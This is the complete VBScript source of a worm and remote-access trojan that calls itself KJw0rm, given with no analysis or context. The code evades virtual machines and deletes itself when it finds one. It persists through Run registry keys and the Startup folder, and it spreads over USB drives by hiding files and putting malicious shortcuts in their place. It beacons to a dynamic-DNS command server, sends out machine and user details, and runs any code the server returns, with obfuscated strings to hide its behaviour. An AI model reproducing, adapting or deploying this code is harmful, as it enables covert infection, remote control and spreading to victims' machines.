'MrLi0nHere
'KJw0rm
'Thanx njq8
On Error Resume Next
dim sh ' shell
set sh =WScript.CreateObject("WScript.Shell")
dim fs ' filesystem
set fs= CreateObject("Scripting.FileSystemObject") 
dim dotnet
dotnet="No"
if fs.fileexists(sh.ExpandEnvironmentStrings("%windir%") & "\Microsoft.NET\Framework\v2.0.50727\vbc.exe") then
dotnet="Yes"
end if
vmcheck
dim host
host= "redtubkof.ddns.net"
dim port
port=1010
dim DR
DR = sh.ExpandEnvironmentStrings("%AppData%") & "\"
dim FN
FN ="System.vbs"
dim fh
dim us
us="~"
ins
dim spl
spl="KsKsK"
dim i
i=0
while true
dim a 
a= split(post("ready",""),spl)
select case a(0)
case "exc"
dim sa
sa= a(1)
execute sa
case "uns"
uns ""
end select
wscript.sleep 4000
i = i + 1
if i> 2 then
i=0
xins
end if
wend
function vmcheck()
On Error Resume Next
Set WMI = GetObject("WinMgmts:")
Set Col = WMI.ExecQuery("Select * from Win32_ComputerSystemProduct")
For Each Ob in Col
if instr( lcase( ob.name),"virtual") >0 then
On Error Resume Next
fs.deletefile(wscript.scriptfullname)
do
wscript.sleep(1000)
loop
end if
next
end Function
function ins
on error resume next
us= sh.regread("HKCU\KJ")
if us="~" then
if lcase( mid(wscript.scriptfullname,2))=":\" &  lcase(fn) then
us="Yes"
sh.regwrite "HKCU\KJ",  us, "REG_SZ"
else
us="No"
sh.regwrite "HKCU\KJ",  us, "REG_SZ"
end if
end if
Err.Clear
fs.CopyFile wscript.scriptfullname,dr & fn ,true
set fh = fs.OpenTextFile( dr & fn, 8, false)
if  Err.Number>0 then
wscript.quit
end if
xins
end function
sub xins
on error resume next
sh.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & fn,  chrw(34) & dr & fn & chrw(34), "REG_SZ"
sh.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\" & fn,  chrw(34) & dr & fn & chrw(34), "REG_SZ"
fs.copyfile wscript.scriptfullname,  CreateObject("Shell.Application").NameSpace(&H7).Self.Path &"\" & fn ,true
for each xx in fs.Drives
if xx.isready then
if xx.FreeSpace >0 then
if xx.drivetype=1 then
if fs.fileexists(xx.path & "\" & fn) then
fs.getfile(xx.path & "\"  & fn).Attributes=0
end if
fs.copyfile dr & fn , xx.path & "\"  & fn,true
dim mx
mx=0
for Each x In fs.GetFolder( xx.path & "\" ).Files
if mx=20 then
exit for
end if
wscript.sleep 1
if instr(x.name,".") Then
if lcase( Split(x.name, ".")(UBound(Split(x.name, "."))))<>"lnk" Then
x.Attributes = 2
if ucase(x.name) <> ucase(fn) Then
mx =mx +1
With sh.CreateShortcut(xx.path & "\"  & x.name & ".lnk")
.TargetPath = "cmd.exe"
.WorkingDirectory = ""
.WindowStyle=7
.Arguments = "/c start " & Replace(fn," ", ChrW(34) _
& " " & ChrW(34)) & "&start " & replace( x.name," ", ChrW(34) & " " & ChrW(34)) & " & exit"
.IconLocation = sh.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\" & sh.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\." & Split(x.name, ".")(UBound(Split(x.name, "."))) & "\") & "\DefaultIcon\")
if instr( .iconlocation,",")=0 then
.iconlocation = .iconlocation &",0"
end if
.Save()
end with
end if
end if
end if
Next
mx=0
fs.CreateFolder(xx.path & "\Videos\" )
for Each x In fs.GetFolder( xx.path & "\" ).SubFolders
if mx=20 then
exit for
end if
wscript.sleep 1
x.Attributes = 2
mx =mx +1
With sh.CreateShortcut(xx.path & "\"  & x.name & ".lnk")
.TargetPath = "cmd.exe"
.WorkingDirectory = ""
.WindowStyle=7
.Arguments = "/c start " & Replace(fn," ", ChrW(34)& " " & ChrW(34))  & "&start explorer /root,%CD%" & replace( x.name," ", ChrW(34) & " " & ChrW(34)) & "& exit"
.IconLocation = "%windir%\system32\SHELL32.dll,3"
.Save()
end with
Next
end if
end if
end if
next
Err.Clear
end sub
function uns(ex)
on error resume Next
fi.close
fh.close
sh.RegDelete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" & FN
sh.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & FN
fs.DeleteFile dr & fn ,true
fs.DeleteFile CreateObject("Shell.Application").NameSpace(&H7).Self.Path &"\" & FN ,True
for each xx in fs.Drives
if xx.isready then
if xx.FreeSpace >0 then
For Each x In fs.GetFolder( xx.path & "\").Files
On Error Resume Next
if instr(x.name,".") then
if lcase( Split(x.name, ".")(UBound(Split(x.name, "."))))<>"lnk" then
x.Attributes = 0
if ucase(x.name) <> ucase(fn) then
fs.deletefile(xx.path & "\" & x.name & ".lnk" )
else
fs.deletefile( xx.path & "\" & x.name )
end if
end if
end If
 Next
For Each x In fs.GetFolder( xx.path & "\").SubFolders
On Error Resume Next
 if fs.fileexists( xx.Path & "\"  & x.Name &".lnk") then
fs.deletefile(xx.path & "\" & x.name & ".lnk" )
end if
x.Attributes = 0
Next
end if
end if
Next
Dim tout
tout=0
Do until w.readystate=4
wscript.sleep(1000)
tout =tout + 1
If tout=10 Then Exit do
Loop
if ex<>"" then
sh.Run "cmd.exe /c ping 0&start " & ex,0, false
end if
wscript.quit
end function
function post(cmd ,da)
post=""
Dim o
Set o = CreateObject("MSXML2.XMLHTTP")
o.open "POST","http://" & host & ":" & port &"/" & cmd, false
o.setRequestHeader "User-Agent:",  inf
o.send da
post=o.responseText
end function
dim xinf
function inf
on error resume next
if xinf="" then
dim s
s="??"
s = hwd
inf = inf & s & "\"
s="??"
s= sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
inf = inf & s & "\"
s="??"
s= sh.ExpandEnvironmentStrings("%USERNAME%")
inf = inf & s & "\"
s="??"
 Set szxquzftjy = GetObject(  "w" & chrw(cint(33+72)) &  "n" &  "m" &  "g" &  "m" &  "t" & chrw(cint(124-9)) &  ":" & chrw(cint(2.86046511627907 * 43)) & chrw(cint(105)) & chrw(cint(63+46)) &  "p" &  "e" & chrw(3534 / 31) & chrw(115) & chrw(2775 / 25) &  "n" & chrw(87+10) &  "t" &  "i" & chrw(13+98) &  "n" & chrw(76) &  "e" & chrw(cint(93+25)) &  "e" & chrw(3888 / 36) &  "=" &  "i" &  "m" &  "p" & chrw(101) & chrw(3876 / 34) & chrw(115) &  "o" &  "n" &  "a" & chrw(cint(116)) & chrw(cint(101)) & chrw(32 * 3.90625) & chrw(cint(51-18)) &        "\"       & chrw(6+86) &  "." & chrw(cint(71+21)) & chrw(72+42) &  "o" & chrw(111) & chrw(116) & chrw(cint(92)) & chrw(17+82) &  "i" & chrw(218 / 2) & chrw(139-21) & chrw(300 / 6)  ) 
 Set yyotvzirsq = szxquzftjy.ExecQuery (  "S" &  "e" & chrw(cint(3 * 36)) &  "e" & chrw(107-8) &  "t" & chrw(cint(46+-14)) &  "*" & chrw(cint(9+23)) &  "f" &  "r" &  "o" &  "m" &  " " &  "W" & chrw(2.28260869565217 * 46) & chrw(102+8) & chrw(2.04 * 25) &  "2" &  "_" & chrw(32+47) & chrw(112) & chrw(48 * 2.10416666666667) &  "r" &  "a" & chrw(117-1) & chrw(cint(105 / 1)) & chrw(cint(66+44)) &  "g" & chrw(71+12) & chrw(cint(4+117)) &  "s" & chrw(cint(116)) &  "e" & chrw(1090 / 10)  ) 
 dim cstdspjgkz 
 For Each aaa in yyotvzirsq 
 jgduwnagqo= aaa.Caption  &   " " & chrw(82+1) & chrw(14+66)   & aaa.ServicePackMajorVersion 
 cstdspjgkz= aaa.countrycode 
 exit for 
 Next 
 jgduwnagqo= replace(jgduwnagqo, chrw(31+46) & chrw(cint(109-4)) &  "c" &  "r" &  "o" &  "s" &  "o" & chrw(cint(102)) &  "t"  ,"") 
 jgduwnagqo= replace(jgduwnagqo,  "W" & chrw(cint(3150 / 30)) & chrw(cint(21 * 5.23809523809524)) & chrw(3700 / 37) &  "o" & chrw(101+18) &  "s" & chrw(32)  ,  "W" & chrw(20+85) &  "n"  ) 
 jgduwnagqo= Replace(jgduwnagqo,  " " & chrw(21.75 * 4) &  "i" &  "n"  ,  "W" & chrw(20+85) &  "n"  ) 
 jgduwnagqo = jgduwnagqo &  chrw(cint(73-41)) &  "x"   & GetObject( chrw(5950 / 50) & chrw(735 / 7) &  "n" & chrw(30+79) & chrw(4.47826086956522 * 23) &  "m" &  "t" &  "s" & chrw(cint(38+20)) &  "r" &  "o" &  "o" & chrw(116) &        "\"       &  "c" &  "i" &  "m" &  "v" &  "2" &  ":" &  "W" & chrw(210 / 2) &  "n" &  "3" & chrw(1800 / 36) &  "_" & chrw(cint(10+70)) &  "r" &  "o" & chrw(27+72) & chrw(3030 / 30) & chrw(cint(49 * 2.3469387755102)) & chrw(115) &  "o" & chrw(cint(124-10)) &  "=" & chrw(cint(8+31)) & chrw(99) & chrw(112) &  "u" &  "0" &  "'"  ).AddressWidth 
inf = inf & jgduwnagqo & "\" & cstdspjgkz &"\0.5X\" & dotnet & nf &"\" & us &"\" & HWD  
xinf=inf
else
inf=xinf
end if
end function
function HWD
HWD="KJw0rm"
On Error Resume Next
Set a = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set aa = a.ExecQuery("SELECT * FROM Win32_LogicalDisk")
For Each aaa In aa
if aaa.VolumeSerialNumber<>"" then
HWD= "KJw0rm_" & aaa.VolumeSerialNumber
exit for
end if
Next
end function
Function nf
On Error Resume next
Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
Dim  aSub, sKey , v
oReg.EnumKey &H80000002,"SOFTWARE\Microsoft\.NETFramework\Policy", aSub
For Each sKey In aSub
If InStr(sKey,"v") > 0 Then
v =  sKey
End if
Next
nf = v
End Function
